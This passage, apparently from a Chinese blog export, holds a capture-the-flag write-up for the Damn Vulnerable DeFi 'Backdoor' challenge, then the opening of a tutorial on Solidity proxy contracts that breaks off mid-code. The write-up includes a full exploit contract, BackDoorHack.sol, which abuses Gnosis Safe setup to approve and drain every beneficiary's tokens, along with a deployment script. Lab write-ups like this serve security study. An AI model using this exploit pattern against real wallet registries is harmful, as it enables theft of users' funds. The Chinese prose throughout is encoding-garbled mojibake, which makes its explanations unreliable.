users[i]çš„é’±åŒ…ä¸èƒ½ä¸ºç©ºï¼Œå¯ä»¥ç†è§£ä¸º user æˆåŠŸæ‰§è¡Œäº† wallets[walletOwner] = walletAddress; ç¬¬ä¸‰å¥æ–­è¨€è¦æ±‚è¯¥ userä¸å†æ˜¯å—ç›Šè€…ï¼ŒåŠè¯¥ç”¨æˆ·å®Œæˆäº†æ³¨å†Œï¼ŒæˆåŠŸæ‰§è¡Œäº†beneficiaries[walletOwner] = false; ç¬¬å››å¥æ–­è¨€è¦æ±‚ç©å®¶æ‹¿åˆ°æ³¨å†Œè¡¨ä¸­çš„å…¨éƒ¨ä»£å¸ã€‚ 2.2 WalletRegistry.solæ³¨å†Œåˆçº¦é€šè¯»ä¸€éå¯ä»¥çœ‹åˆ°æ¶‰åŠåˆ°è½¬é’±çš„æ“ä½œåªæœ‰proxyCreatedå‡½æ•°ã€‚ä»”ç»†åˆ†æè¯¥åˆçº¦ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869function proxyCreated(GnosisSafeProxy proxy, address singleton, bytes calldata initializer, uint256) external override&#123; // è¯¥åœ°å€çš„ä»£å¸ä½™é¢åº”è¯¥å¤§äº 10 ETH if (token.balanceOf(address(this)) &lt; PAYMENT_AMOUNT) &#123; // fail early revert NotEnoughFunds(); &#125; // å°†ä»£ç†åœ°å€ä¿®æ”¹ä¸ºå¯æ¥å—è½¬è´¦çš„ &quot;é’±åŒ…&quot; åœ°å€ address payable walletAddress = payable(proxy); // Ensure correct factory and master copy // è°ƒç”¨è€…åº”è¯¥ä¸ºé’±åŒ…å·¥å‚ï¼Œé€šè¿‡ GnosisiSafeProxyFactoryè°ƒç”¨ createProxyWithCallback å‡½æ•°å³å¯æ»¡è¶³ if (msg.sender != walletFactory) &#123; revert CallerNotFactory(); &#125; // if (singleton != masterCopy) &#123; revert FakeMasterCopy(); &#125; // Ensure initial calldata was a call to `GnosisSafe::setup` // bytes4(initializer[:4]) è¡¨ç¤ºå–å‰å››ä¸ªå­—èŠ‚ï¼Œä¿è¯ initializerä¸­åŒ…å«setupå‡½æ•°ï¼Ÿ if (bytes4(initializer[:4]) != GnosisSafe.setup.selector) &#123; revert InvalidInitialization(); &#125; // Ensure wallet initialization is the expected // æŒ‰ç†æ¥è¯´å¦‚æœ walletAddress æ˜¯åªç»å†è¿‡éƒ¨ç½²æ“ä½œå¾—æ¥çš„ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„ é˜ˆå€¼=1 uint256 threshold = GnosisSafe(walletAddress).getThreshold(); // è¦æ±‚é˜ˆå€¼ä¸º 1ï¼Œæ‰èƒ½é€šè¿‡ // å¸¸è§„æ€ç»´æ— ç–‘è·¯æ˜¯è¢«å µæ­»çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å†’å…… GnosisSafe åˆçº¦ï¼Œæä¾›ä¸€ä¸ªç›¸åŒçš„getThreshold()å‡½æ•° if (threshold != EXPECTED_THRESHOLD) &#123; revert InvalidThreshold(threshold); &#125; // è·å–ä»£ç†åˆçº¦ä¸­çš„æ‰€æœ‰ownerå¹¶å°†å…¶å­˜å‚¨åœ¨æ•°ç»„ä¸­ address[] memory owners = GnosisSafe(walletAddress).getOwners(); // è¦æ±‚ownersçš„ä¸ªæ•°ä¸ä¸º 1 if (owners.length != EXPECTED_OWNERS_COUNT) &#123; revert InvalidOwnersCount(owners.length); &#125; // Ensure the owner is a registered beneficiary address walletOwner; unchecked &#123; walletOwner = owners[0]; &#125; if (!beneficiaries[walletOwner]) &#123; // åˆ¤æ–­owners[0]æ˜¯ä¸æ˜¯å—ç›Šäºº revert OwnerIsNotABeneficiary(); &#125; address fallbackManager = _getFallbackManager(walletAddress); if (fallbackManager != address(0)) revert InvalidFallbackManager(fallbackManager); // Remove owner as beneficiary beneficiaries[walletOwner] = false; // Register the wallet under the owner&#x27;s address wallets[walletOwner] = walletAddress; // Pay tokens to the newly created wallet SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);&#125; æ˜“çŸ¥ï¼Œè¦æ‰§è¡Œ SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT)ï¼Œåˆ™å¿…é¡»è¦é€šè¿‡å‰é¢ä¸ƒä¸ªæ–­è¨€ã€‚ é€ä¸€åˆ†ææ–­è¨€ï¼š if (token.balanceOf(address(this)) &lt; PAYMENT_AMOUNT)ï¼šè¿™ä¸ªä¸æ˜¯æˆ‘ä»¬è€ƒè™‘çš„ï¼Œé‡‘é¢ç”±é¢˜ç›®æ§åˆ¶ã€‚ if (msg.sender != walletFactory)ï¼šè¦æ±‚è°ƒç”¨è€…ä¸º GnosisSafeProxyFactoryåˆçº¦ï¼Œåˆ†æ GnosisSafeProxyFactoryåˆçº¦ä¸éš¾çŸ¥é“ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå‡½æ•° createProxyWithCallbackè°ƒç”¨äº†proxyCreatedå‡½æ•°ï¼Œä¸”æ³¨å†Œè¡¨æ˜¯IProxyCreationCallbackçš„å®ç°ç±»ï¼Œæ‰€ä»¥é€šè¿‡è°ƒç”¨createProxyWithCallbackå³å¯é€šè¿‡ç¬¬äºŒä¸ªæ–­è¨€ã€‚ if (singleton != masterCopy)ï¼Œåœ¨è°ƒç”¨createProxyWithCallbackå‡½æ•°çš„æ—¶å€™ä¼ å…¥ä¸masterCopyç›¸åŒçš„å€¼ã€‚ if (bytes4(initializer[:4]) != GnosisSafe.setup.selector)ï¼šå¯ä»¥è‡ªå·±åŒ…è£…è¿™ä¸ªå€¼ï¼Œåªè¦è¯¥å€¼çš„å‰ 4bytesä¸ setupçš„é€‰æ‹©å™¨ç›¸åŒå³å¯ã€‚ GnosisSafe(walletAddress).getThreshold() != EXPECTED_THRESHOLDï¼šè¿™ä¸ªå¾ˆç¦»è°±ï¼Œæ²¡æœ‰å¯¹ä»£ç†åˆçº¦æœ‰ä¸€å®šçš„äº†è§£çš„è¯å¾ˆéš¾ç†è§£åˆ°è¿™é‡Œå¦‚ä½•é€šè¿‡ï¼Œå¸¸è§„æ€ç»´GnosisSafeåœ¨åˆå§‹åŒ–çš„æ—¶å€™å°±å·²ç»å°†thresholdçš„å€¼è®¾ç½®ä¸º 1ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡è¿™ä¸ªæ–­è¨€ï¼Œå®åˆ™ä¸ç„¶ï¼ŒwalletAddressæ˜¯ä¸€ä¸ªä»£ç†åˆçº¦ï¼Œè¿”å›çš„æ˜¯ä»£ç†åˆçº¦çš„thresholdçš„å€¼ï¼Œå…¶å€¼æœªè¢«åˆå§‹åŒ–ç»“æœæ˜¯0ï¼ŒæŒ‰ç†æ¥è¯´è¿™ä¸ªæ–­è¨€æ— æ³•é€šè¿‡æ‰å¯¹ã€‚ä½†æ˜¯å›æƒ³ä¸Šä¸€ä¸ªæ–­è¨€ï¼Œè°ƒç”¨äº†setupå‡½æ•°ï¼Œé‡Œé¢åˆè°ƒç”¨äº†å¥½å‡ ä¸ªæ–¹æ³•ï¼Œå…¶ä¸­çš„ setupOwnerså‡½æ•°å°±å¾ˆæœ‰è¯´æ³•ï¼Œä»”ç»†åˆ†æ setupOwnerså‡½æ•°ï¼š 12345678910111213141516function setupOwners(address[] memory _owners, uint256 _threshold) internal &#123; require(threshold == 0, &quot;GS200&quot;); require(_threshold &lt;= _owners.length, &quot;GS201&quot;); require(_threshold &gt;= 1, &quot;GS202&quot;); address currentOwner = SENTINEL_OWNERS; for (uint256 i = 0; i &lt; _owners.length; i++) &#123; address owner = _owners[i]; require(owner != address(0) &amp;&amp; owner != SENTINEL_OWNERS &amp;&amp; owner != address(this) &amp;&amp; currentOwner != owner, &quot;GS203&quot;); require(owners[owner] == address(0), &quot;GS204&quot;); owners[currentOwner] = owner; currentOwner = owner; &#125; owners[currentOwner] = SENTINEL_OWNERS; ownerCount = _owners.length; threshold = _threshold;&#125; è¿™ä¸ªå‡½æ•°æœ¬èº«åœ¨GnosisSafeåˆçº¦å†…ï¼Œä½†æ˜¯GnosisSafeåœ¨åˆå§‹åŒ–çš„æ—¶å€™ï¼Œå·²ç»å°† thresholdçš„å€¼è®¾ç½®ä¸ºäº† 1ï¼Œæˆ‘ç¬¬ä¸€æ¬¡é˜…è¯»æºç çš„æ—¶å€™ï¼Œæ€ä¹ˆä¹Ÿæä¸æ‡‚è¿™ä¸ªå‡½æ•°çš„æ„ä¹‰æ˜¯ä»€ä¹ˆï¼Œè‡ªå·±åˆä¸å…è®¸è‡ªå·±ç”¨ï¼Œç®€ç›´å°±æ˜¯ç”»è›‡æ·»è¶³ã€‚ç›´åˆ°æˆ‘è¯»äº†ä¸€å¤©çš„é¢˜ç›®ï¼Œæ‰æ˜ç™½è¿™æ˜¯è§£é¢˜çš„ä¸€ä¸ªå…³é”®ç‚¹ï¼Œæˆ‘æ˜¯é€šè¿‡ä»£ç†åˆçº¦è¿›åˆ°æ­¤å‡½æ•°ï¼Œä¸”åœ¨ä»£ç†åˆçº¦ä¸­æ²¡æœ‰è¯¥å˜é‡ï¼Œæ‰€ä»¥ thresholdçš„å€¼é»˜è®¤æ˜¯0ï¼Œè¿™å°±ä¸ºæˆ‘è¿›è¡Œä¸‹ä¸€æ­¥ï¼ˆé€šè¿‡å‰©ä¸‹çš„æ–­è¨€ï¼‰å¥ å®šäº†åŸºç¡€ï¼Œçœ‹åˆ°æœ€åä¸€è¡Œï¼Œæ›´æ–°thresholdçš„å€¼ï¼Œåœ¨ä»£ç†åˆçº¦ä¸­ thresholdçš„å€¼é»˜è®¤æ˜¯0ï¼Œé€šè¿‡ä»£ç†åˆçº¦è°ƒç”¨ getThreshold()å‡½æ•°ï¼Œå…¶å€¼ä¹Ÿæ˜¯0ï¼Œä½†æ˜¯åªè¦æˆ‘ä»¬åœ¨è¿™é‡Œä¿®æ”¹è¿™ä¸ªå€¼ï¼ŒåŒæ—¶ä¹Ÿæ˜¯åœ¨ä¿®æ”¹ä»£ç†åˆçº¦ä¸­thresholdçš„å€¼ã€‚å°†å…¶ä¿®æ”¹ä¸º1ï¼Œè¿™æ ·å°±å¯é€šè¿‡æ­¤æ–­è¨€ã€‚ if (owners.length != EXPECTED_OWNERS_COUNT)ï¼šè¦æ±‚ä¼ å…¥çš„æ•°ç»„é•¿åº¦ä¸º1ï¼Œç®€å•ï¼Œä¾taã€‚ if (!beneficiaries[walletOwner])ï¼šç»¼åˆä¸Šä¸€ä¸ªæ–­è¨€ï¼Œç›´æ¥å°†é¢˜ç›®æˆæƒçš„4ä¸ªç”¨æˆ·ï¼Œè¿›è¡Œéå†ï¼ŒæŒ¨ä¸ªæ‰§è¡Œè¯¥å‡½æ•°å³å¯ã€‚ if (fallbackManager != _getFallbackManager(walletAddress)ï¼šè‡³äºæœ€åä¸€ä¸ªæ–­è¨€å˜›ï¼Œæˆ‘ä¸æ˜¯å¾ˆæ‡‚ï¼Œä½†æˆ‘çš„ç†è§£æ˜¯ï¼Œåªæœ‰ walletAddresså­˜å‚¨çš„storageå˜é‡åˆ«å¤šçš„ç¦»è°±å¤§çš„ç¦»è°±å°±è¡Œï¼Œä¸è¶…è¿‡uint256(keccak256(&quot;fallback_manager.handler.address&quot;))å³å¯ã€‚ åˆ°æ­¤ï¼Œæˆ‘å·²ç»æœ‰åŠæ³•é€ä¸€çªç ´æ–­è¨€ï¼Œç°åœ¨è¦è€ƒè™‘çš„æ˜¯ï¼ŒSafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT)ï¼Œè¿™è¡Œä»£ç å°† ERC20ä»£å¸è½¬å…¥åˆ°ä»£ç†åˆçº¦è´¦æˆ·é‡Œï¼Œæˆ‘ä»¬çŸ¥é“ä»£ç†åˆçº¦ä¸­ï¼Œæ²¡ä»€ä¹ˆå‡½æ•°ï¼Œtaéƒ½æ˜¯é€šè¿‡é€»è¾‘åˆçº¦å®ç°åŠŸèƒ½ï¼Œä¸”taæ˜¯é€šè¿‡ degatecallæ‰§è¡Œå‡½æ•°è°ƒç”¨çš„ï¼Œè¿™æ ·ä¸€æ¥ï¼Œmsg.senderæ°¸è¿œä¸å¯èƒ½æ˜¯taè‡ªå·±ã€‚å½“ç„¶è¿™æ˜¯æ˜¨å¤©çš„æˆ‘çš„è®¤çŸ¥ï¼Œè¢«è¿™ä¸ªç‚¹æŠ˜ç£¨äº†ä¸¤å¤©åŠï¼Œé€šè¿‡å®è·µæˆ‘æ‰å‘ç°ã€‚ ğŸ“Œåœ¨å¤šé‡ delegatacallå’Œ callç»“åˆä½¿ç”¨çš„æ—¶å€™ï¼Œå¦‚æœæœ€åä¸€ä¸ªè°ƒç”¨çš„æ–¹å¼ä¸ºcallï¼Œé‚£ä¹ˆï¼Œæ•´æ¡è°ƒç”¨é“¾çš„msg.senderå°†ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå¯¹äºæœ€åä¸€ä¸ªåˆçº¦æ¥è¯´ï¼Œtaçš„è°ƒç”¨è€…ä¸ºProxyï¼Œå³ä»£ç†åˆçº¦ã€‚è¿™ç‚¹åæ­£é æˆ‘è‡ªå·±æƒ³çš„è¯ï¼Œæƒ³åˆ°æˆ‘Gäº†æˆ‘éƒ½æƒ³ä¸åˆ°ï¼Œæ‰€ä»¥ä¸æ‡‚çš„å°±åŠ¨æ‰‹ã€‚ å°†ä¸Šè¿°åˆ†æç»¼åˆèµ·æ¥ï¼Œå°±æ˜¯æœ¬é¢˜çš„è§£æ³•äº†ã€‚ è¿™æ˜¯æœ€å¼€å§‹çš„æ€è·¯åˆ†æ 123456789101112131415/** æ€è·¯ï¼š 1. è®©æ¯ä¸€ä¸ª user éƒ½ä¸ºæˆ‘ä»¬æ‰§è¡Œ approveï¼Œä»¥æ–¹ä¾¿å°†userçš„æ”¶ç›Šè½¬åˆ°playerè´¦æˆ·ä¸Š 2. ç¬¬ä¸€ä¸ªæ–­è¨€ï¼Œä¸æ˜¯æˆ‘ä»¬èƒ½å·¦å³çš„ 3. ç¬¬äºŒä¸ªæ–­è¨€ï¼Œè¦ä½¿è°ƒç”¨è€… msg.sender æ˜¯ walletFactory å¯ä»¥é€šè¿‡ GnosisiSafeProxyFactoryè°ƒç”¨ createProxyWithCallback å‡½æ•°å³å¯æ»¡è¶³ 4. ç¬¬ä¸‰ä¸ªæ–­è¨€ï¼Œæ ¹æ®åˆçº¦çš„éƒ¨ç½²æ¥è‡ªå®šä¹‰ singleton å³å¯ 5. ç¬¬å››ä¸ªæ–­è¨€ï¼Œè¦æ±‚bytes ç±»å‹çš„ initializer å‰å››ä¸ªå­—èŠ‚æ˜¯ GnosisSafe.setup.selector ç®€å•æ»¡è¶³ 6. ç¬¬äº”ä¸ªæ–­è¨€ï¼Œè¦æ±‚ GnosisSafe(walletAddress).getThreshold() = 1ï¼Œ æˆ‘ä»¬åªè¦é€šè¿‡ä»£ç†æ¨¡å¼æ‰§è¡Œsetupä¹‹åå°±å¯ä»¥ä½¿å…¶ç­‰äº1 7. ç¬¬å…­ä¸ªæ–­è¨€ï¼Œowners[0]éœ€è¦æ˜¯å—ç›Šè€…ï¼Œæˆ‘ä»¬åˆ°æ—¶å€™å°†å—ç›Šè€…æ•°ç»„ä¼ å…¥è¿›æ¥å³å¯ 8. ç¬¬ä¸ƒä¸ªæ–­è¨€ï¼Œæˆ‘çš„ç†è§£æ˜¯ä¸èƒ½ walletAddress ä¸­å­˜å‚¨çš„ä¸œè¥¿å³æ’æ§½åˆ«å¤ªå¤šï¼Œ ä¸èƒ½è¶…è¿‡ uint256(keccak256(&quot;fallback_manager.handler.address&quot;))ï¼Œå¦åˆ™å…¶åçš„20byteså°†ä¸å…¨ä¸º0ï¼Œå³address(0) */ 3. solving3.1 BackDoorHack.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./WalletRegistry.sol&quot;;import &quot;@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol&quot;;// å…¶ç›®çš„å°±æ˜¯ä¸ºäº†æ”¹å˜ä¼ é€’é“¾ä¸­çš„msg.sender,ä½¿proxyæˆä¸ºmsg.sendercontract BackdoorApprover &#123; function approve(address _token, address hacker, uint256 amount) public &#123; IERC20(_token).approve(hacker, amount); &#125;&#125;contract BackDoorHack &#123; uint256 constant PAYMENT_AMOUNT = 10 ether; IERC20 token; GnosisSafeProxyFactory walletFactory; address singleton; WalletRegistry walletRegistry; address[4] users; BackdoorApprover public approver; constructor( address _token, address _walletFactory, address _singleton, address _walletRegistry, address[4] memory _users )&#123; token = IERC20(_token); walletFactory = GnosisSafeProxyFactory(_walletFactory); singleton = _singleton; walletRegistry = WalletRegistry(_walletRegistry); users = _users; approver = new BackdoorApprover(); attack(); &#125; function attack() public &#123; // æˆæƒæ“ä½œçš„data bytes memory approve_data = abi.encodeWithSignature(&quot;approve(address,address,uint256)&quot;, token, address(this), PAYMENT_AMOUNT); // ç”¨æ¥ç»™setupå‡½æ•°ä¼ å‚ address[] memory owners = new address[](1); // éå†æ¯ä¸€ä¸ªç”¨æˆ· for (uint256 i = 0; i &lt; users.length; i++) &#123; owners[0] = users[i]; // åˆå§‹åŒ–setupçš„data bytes memory initializer = abi.encodeWithSelector( GnosisSafe.setup.selector, owners, 1, address(approver), approve_data, address(0), address(token), 0, payable(address(msg.sender))); GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(singleton, initializer, i, walletRegistry); token.transferFrom(address(proxy), msg.sender, PAYMENT_AMOUNT); &#125; &#125;&#125; 3.2 challenge.js1234567891011it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ await (await ethers.getContractFactory(&#x27;BackDoorHack&#x27;, player)).deploy( token.address, walletFactory.address, masterCopy.address, walletRegistry.address, users ); &#125;); è¿è¡Œç»“æœ è§£é¢˜æˆåŠŸã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Proxy Contract No.1","slug":"DEFI/Proxy/Proxy_Contract","date":"2023-07-19T01:47:10.000Z","updated":"2023-07-19T01:47:10.000Z","comments":true,"path":"2023/07/19/DEFI/Proxy/Proxy_Contract/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/19/DEFI/Proxy/Proxy_Contract/","excerpt":"","text":"ä»£ç†åˆçº¦1. ä»£ç†æ¨¡å¼ solidityåˆçº¦éƒ¨ç½²åˆ°é“¾ä¸Šä¹‹åï¼Œä»£ç æ˜¯ä¸å¯å˜çš„ã€‚ è¿™ä¸€ç‰¹æ€§å­˜åœ¨äº†ä¸€ä¸ªä¸¥é‡çš„ç¼ºç‚¹ï¼šå°±ç®—åˆçº¦ä¸­å­˜åœ¨bugï¼Œä¹Ÿä¸èƒ½ä¿®æ”¹æˆ–è€…å‡çº§ï¼Œåªèƒ½éƒ¨ç½²æ–°åˆçº¦ã€‚ä½†æ˜¯æ–°åˆçº¦çš„åœ°å€å’Œæ—§åˆçº¦çš„åœ°å€ä¸ä¸€æ ·ï¼Œè€Œä¸”åˆçº¦çš„æ•°æ®ä¹Ÿéœ€è¦èŠ±è´¹å¤§é‡çš„gasè¿›è¡Œè¿ç§»ã€‚ ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œä»è€Œå¼•å…¥äº† ä»£ç†æ¨¡å¼è¿™ä¸€æ¦‚å¿µã€‚ ä»£ç†æ¨¡å¼å°†åˆçº¦æ•°æ®å’Œé€»è¾‘åˆ†å¼€ï¼Œåˆ†åˆ«ä¿å­˜åœ¨ä¸åŒçš„åˆçº¦ä¸­ã€‚ä»¥ä¸Šå›¾ä¸ºä¾‹ï¼Œæ•°æ®ï¼ˆçŠ¶æ€å˜é‡ï¼‰å­˜å‚¨åœ¨ä»£ç†åˆçº¦ä¸­ï¼Œè€Œé€»è¾‘ï¼ˆå‡½æ•°ï¼‰ä¿å­˜åœ¨å¦ä¸€ä¸ªé€»è¾‘åˆçº¦ä¸­ã€‚é€»è¾‘åˆçº¦ï¼ˆProxyï¼‰é€šè¿‡delegatecallï¼Œå°†å‡½æ•°è°ƒç”¨å…¨æƒå§”æ‰˜ç»™é€»è¾‘åˆçº¦ï¼ˆImplementationï¼‰æ‰§è¡Œï¼Œå†æŠŠæœ€ç»ˆçš„ç»“æœè¿”å›ç»™è°ƒç”¨è€…ï¼ˆCallerï¼‰ã€‚ 2. ä»£ç†åˆçº¦å®ƒç”±OpenZeppelinçš„Proxyåˆçº¦ç®€åŒ–è€Œæ¥ã€‚å®ƒæœ‰ä¸‰ä¸ªéƒ¨åˆ†ï¼šä»£ç†åˆçº¦Proxyï¼Œé€»è¾‘åˆçº¦Logicï¼Œå’Œä¸€ä¸ªè°ƒç”¨ç¤ºä¾‹Callerã€‚å®ƒçš„é€»è¾‘å¹¶ä¸å¤æ‚ï¼š é¦–å…ˆéƒ¨ç½²é€»è¾‘åˆçº¦Logicã€‚ åˆ›å»ºä»£ç†åˆçº¦Proxyï¼ŒçŠ¶æ€å˜é‡implementationè®°å½•Logicåˆçº¦åœ°å€ã€‚ Proxyåˆçº¦åˆ©ç”¨å›è°ƒå‡½æ•°fallbackï¼Œå°†æ‰€æœ‰è°ƒç”¨å§”æ‰˜ç»™Logicåˆçº¦ æœ€åéƒ¨ç½²è°ƒç”¨ç¤ºä¾‹Calleråˆçº¦ï¼Œè°ƒç”¨Proxyåˆçº¦ã€‚ æ³¨æ„ï¼šLogicåˆçº¦å’ŒProxyåˆçº¦çš„çŠ¶æ€å˜é‡å­˜å‚¨ç»“æ„ç›¸åŒï¼Œä¸ç„¶delegatecallä¼šäº§ç”Ÿæ„æƒ³ä¸åˆ°çš„è¡Œä¸ºï¼Œæœ‰å®‰å…¨éšæ‚£ é€»è¾‘åˆçº¦Logic implementationï¼šå ä½å˜é‡ï¼Œä¸Proxyåˆçº¦ä¿æŒä¸€è‡´ï¼Œé˜²æ­¢æ’æ§½å†²çªã€‚ xï¼šuintå˜é‡ï¼Œè¢«è®¾ç½®ä¸º99ã€‚ CallSuccessäº‹ä»¶ï¼šåœ¨è°ƒç”¨æˆåŠŸæ—¶é‡Šæ”¾ã€‚ increment()å‡½æ•°ï¼šä¼šè¢«Proxyåˆçº¦è°ƒç”¨ï¼Œé‡Šæ”¾CallSuccessäº‹ä»¶ï¼Œå¹¶è¿”å›ä¸€ä¸ªuintï¼Œå®ƒçš„selectorä¸º0xd09de08aã€‚å³ abi.encodeWithSignature(&quot;increment()&quot;)&#x3D; 0xd09de08aã€‚ 123456789101112131415/** * @dev é€»è¾‘åˆçº¦ï¼Œæ‰§è¡Œè¢«å§”æ‰˜çš„è°ƒç”¨ */contract Logic &#123; address public implementation; // ä¸Proxyä¿æŒä¸€è‡´ï¼Œé˜²æ­¢æ’æ§½å†²çª uint public x = 99; event CallSuccess(); // è°ƒç”¨æˆåŠŸäº‹ä»¶ // è¿™ä¸ªå‡½æ•°ä¼šé‡Šæ”¾CallSuccessäº‹ä»¶å¹¶è¿”å›ä¸€ä¸ªuintã€‚ // å‡½æ•°selector: 0xd09de08a function increment() external returns(uint) &#123; emit CallSuccess(); return x + 1; &#125;&#125; è§£è¯»ï¼š Logicå‡½æ•°æ˜¯æä¾›å‡½æ•°çš„ï¼Œç”¨äºæœåŠ¡è°ƒç”¨è€…ï¼Œè¿›è¡Œä¸€äº›æ•°æ®çš„ä¿®æ”¹ä¹‹ç±»çš„ã€‚è€Œé€»è¾‘åˆçº¦ä¹Ÿæ˜¯æœ€å®¹æ˜“å‡ºç°bugæˆ–éœ€è¦å‡çº§çš„åˆçº¦ã€‚ è°ƒç”¨è€…åˆçº¦Callerå®ƒæœ‰1ä¸ªå˜é‡ï¼Œ2ä¸ªå‡½æ•°ï¼š proxyï¼šçŠ¶æ€å˜é‡ï¼Œè®°å½•ä»£ç†åˆçº¦åœ°å€ã€‚ æ„é€ å‡½æ•°ï¼šåœ¨éƒ¨ç½²åˆçº¦æ—¶åˆå§‹åŒ–proxyå˜é‡ã€‚ increase()ï¼šåˆ©ç”¨callæ¥è°ƒç”¨ä»£ç†åˆçº¦çš„increment()å‡½æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªuintã€‚åœ¨è°ƒç”¨æ—¶ï¼Œæˆ‘ä»¬åˆ©ç”¨abi.encodeWithSignature()è·å–äº†increment()å‡½æ•°çš„selectorã€‚åœ¨è¿”å›æ—¶ï¼Œåˆ©ç”¨abi.decode()å°†è¿”å›å€¼è§£ç ä¸ºuintç±»å‹ã€‚ 12345678910111213141516/** * @dev Calleråˆçº¦ï¼Œè°ƒç”¨ä»£ç†åˆçº¦ï¼Œå¹¶è·å–æ‰§è¡Œç»“æœ */contract Caller&#123; address public proxy; // ä»£ç†åˆçº¦åœ°å€ constructor(address proxy_)&#123; proxy = proxy_; &#125; // é€šè¿‡ä»£ç†åˆçº¦è°ƒç”¨increment()å‡½æ•° function increment() external returns(uint) &#123; ( , bytes memory data) = proxy.call(abi.encodeWithSignature(&quot;increment()&quot;)); return abi.decode(data,(uint)); &#125;&#125; è§£è¯»ï¼š ( , bytes memory data) = proxy.call(abi.encodeWithSignature(&quot;increment()&quot;)); è¡¨ç¤ºé€šè¿‡proxyè°ƒç”¨ Proxyä¸­çš„ increment()å‡½æ•°ï¼Œæ­¤æ—¶å¯¹äºProxyåˆçº¦æ¥è¯´ï¼Œmsg.data æ˜¯ abi.encodeWithSignature(&quot;increment()&quot;) ä»£ç†åˆçº¦Proxyç”¨åˆ°äº†å†…è”æ±‡ç¼–ï¼Œå› æ­¤æ¯”è¾ƒéš¾ç†è§£ã€‚å®ƒåªæœ‰ä¸€ä¸ªçŠ¶æ€å˜é‡ï¼Œä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå’Œä¸€ä¸ªå›è°ƒå‡½æ•°ã€‚çŠ¶æ€å˜é‡implementationï¼Œåœ¨æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–ï¼Œç”¨äºä¿å­˜Logicåˆçº¦åœ°å€ã€‚ Proxyçš„å›è°ƒå‡½æ•°å°†å¤–éƒ¨å¯¹æœ¬åˆçº¦çš„è°ƒç”¨å§”æ‰˜ç»™ Logic åˆçº¦ã€‚è¿™ä¸ªå›è°ƒå‡½æ•°å¾ˆåˆ«è‡´ï¼Œå®ƒåˆ©ç”¨å†…è”æ±‡ç¼–ï¼ˆinline assemblyï¼‰ï¼Œè®©æœ¬æ¥ä¸èƒ½æœ‰è¿”å›å€¼çš„å›è°ƒå‡½æ•°æœ‰äº†è¿”å›å€¼ã€‚å…¶ä¸­ç”¨åˆ°çš„å†…è”æ±‡ç¼–æ“ä½œç ï¼š calldatacopy(t, f, s)ï¼šå°†calldataï¼ˆè¾“å…¥æ•°æ®ï¼‰ä»ä½ç½®få¼€å§‹å¤åˆ¶så­—èŠ‚åˆ°memï¼ˆå†…å­˜ï¼‰çš„ä½ç½®tã€‚ delegatecall(g, a, in, insize, out, outsize)ï¼šè°ƒç”¨åœ°å€açš„åˆçº¦ï¼Œè¾“å…¥ä¸ºmem[in..(in+insize)) ï¼Œè¾“å‡ºä¸ºmem[out..(out+outsize))ï¼Œ æä¾›gweiçš„ä»¥å¤ªåŠgasã€‚è¿™ä¸ªæ“ä½œç åœ¨é”™è¯¯æ—¶è¿”å›0ï¼Œåœ¨æˆåŠŸæ—¶è¿”å›1ã€‚ returndatacopy(t, f, s)ï¼šå°†returndataï¼ˆè¾“å‡ºæ•°æ®ï¼‰ä»ä½ç½®få¼€å§‹å¤åˆ¶så­—èŠ‚åˆ°memï¼ˆå†…å­˜ï¼‰çš„ä½ç½®tã€‚ switchï¼šåŸºç¡€ç‰ˆif/elseï¼Œä¸åŒçš„æƒ…å†µcaseè¿”å›ä¸åŒå€¼ã€‚å¯ä»¥æœ‰ä¸€ä¸ªé»˜è®¤çš„defaultæƒ…å†µã€‚ return(p, s)ï¼šç»ˆæ­¢å‡½æ•°æ‰§è¡Œ, è¿”å›æ•°æ®mem[p..(p+s))ã€‚ revert(p, s)ï¼šç»ˆæ­¢å‡½æ•°æ‰§è¡Œ, å›æ»šçŠ¶æ€ï¼Œè¿”å›æ•°æ®mem[p..(p+s))ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142contract Proxy &#123; address public implementation; // é€»è¾‘åˆçº¦åœ°å€ã€‚implementationåˆçº¦åŒä¸€ä¸ªä½ç½®çš„çŠ¶æ€å˜é‡ç±»å‹å¿…é¡»å’ŒProxyåˆçº¦çš„ç›¸åŒï¼Œä¸ç„¶ä¼šæŠ¥é”™ã€‚ /** * @dev åˆå§‹åŒ–é€»è¾‘åˆçº¦åœ°å€ */ constructor(address implementation_)&#123; implementation = implementation_; &#125; /*** @dev å›è°ƒå‡½æ•°ï¼Œå°†æœ¬åˆçº¦çš„è°ƒç”¨å§”æ‰˜ç»™ `implementation` åˆçº¦* é€šè¿‡assemblyï¼Œè®©å›è°ƒå‡½æ•°ä¹Ÿèƒ½æœ‰è¿”å›å€¼*/fallback() external payable &#123; address _implementation = implementation; assembly &#123; // å°†msg.dataæ‹·è´åˆ°å†…å­˜é‡Œ // calldatacopyæ“ä½œç çš„å‚æ•°: å†…å­˜èµ·å§‹ä½ç½®ï¼Œcalldataèµ·å§‹ä½ç½®ï¼Œcalldataé•¿åº¦ calldatacopy(0, 